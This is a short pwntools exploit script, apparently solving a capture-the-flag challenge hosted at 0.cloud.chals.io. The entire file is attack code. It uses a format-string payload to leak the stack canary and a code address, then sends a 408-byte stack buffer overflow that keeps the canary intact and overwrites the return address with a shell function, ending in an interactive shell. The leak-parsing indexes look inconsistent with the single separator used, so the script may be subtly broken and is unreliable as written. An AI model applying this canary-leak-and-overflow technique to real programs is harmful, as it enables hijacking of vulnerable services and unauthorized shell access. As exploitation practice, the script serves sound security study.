from pwn import *

# r = process("chained-dist")
# gdb.attach(r)

r = remote(b"0.cloud.chals.io", 23188)


print(r.recvuntil(b"> "))

payload = b"%59$p***%49$p"
r.sendline(payload)

output = r.recvuntil(b"> ").decode("utf-8")

canary = int(output.split("***")[1], 16)
info("canary: 0x%x" % canary)

shell_address = int(output.split("***")[2], 16) - 0x63
info("bashh: 0x%x" % shell_address)

r.sendline(b"malicious_binary")
r.recvuntil(b":\n")

payload = b"A" * 408 + p64(canary) + p64(0) + p64(shell_address)

r.sendline(payload)
r.interactive()